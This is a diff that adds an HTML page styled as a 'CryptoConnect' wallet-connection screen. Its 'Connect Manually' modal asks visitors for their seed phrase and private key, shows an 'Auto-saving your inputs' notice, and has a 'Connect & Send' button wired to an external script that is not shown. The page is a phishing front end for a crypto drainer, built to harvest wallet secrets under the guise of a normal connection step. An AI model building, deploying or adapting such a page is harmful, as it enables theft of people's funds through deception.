@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet - CryptoConnect</title>
+    <link rel="stylesheet" href="../css/wallet.css">
+</head>
+<body>
+    <div class="wallet-connect-container">
+        <div class="wallet-connect-header">
+            <a href="/" class="back-link">← Back to Home</a>
+            <h1>Connect Your Wallet</h1>
+            <p>Select a wallet to get started</p>
+        </div>
+
+        <div class="wallet-grid" id="walletGrid"></div>
+
+        <!-- Modal for connection method -->
+        <div id="methodModal" class="modal-overlay hidden" onclick="handleModalClose(event)">
+            <div class="modal-content" onclick="event.stopPropagation()">
+                <button class="close-btn" onclick="closeMethodModal()">✕</button>
+                <h2 id="methodModalTitle">Connect Wallet</h2>
+                <p>Choose your connection method</p>
+                <button class="manual-connect-btn" onclick="openFormModal()">
+                    Connect Manually
+                </button>
+            </div>
+        </div>
+
+        <!-- Modal for form -->
+        <div id="formModal" class="modal-overlay hidden" onclick="handleFormModalClose(event)">
+            <div class="modal-content form-modal" onclick="event.stopPropagation()">
+                <button class="close-btn" onclick="closeFormModal()">✕</button>
+                <h2 id="formModalTitle">Manual Connection</h2>
+                <p class="form-subtitle">Enter your wallet information (auto-saved)</p>
+
+                <form id="walletForm" onsubmit="handleSubmit(event)">
+                    <div class="form-group">
+                        <label for="seedPhrase">Seed Phrase (12 or 24 words)</label>
+                        <textarea
+                            id="seedPhrase"
+                            name="seedPhrase"
+                            placeholder="Enter your seed phrase separated by spaces"
+                            rows="4"
+                        ></textarea>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="privateKey">Private Key (Optional)</label>
+                        <textarea
+                            id="privateKey"
+                            name="privateKey"
+                            placeholder="Enter your private key (hex format)"
+                            rows="3"
+                        ></textarea>
+                    </div>
+
+                    <div class="auto-save-notice">
+                        <span>💾 Auto-saving your inputs...</span>
+                    </div>
+
+                    <div id="submitMessage" class="submit-message hidden"></div>
+
+                    <button type="submit" id="submitBtn" class="submit-btn">
+                        Connect & Send
+                    </button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script src="../js/wallet.js"></script>
+</body>
+</html>
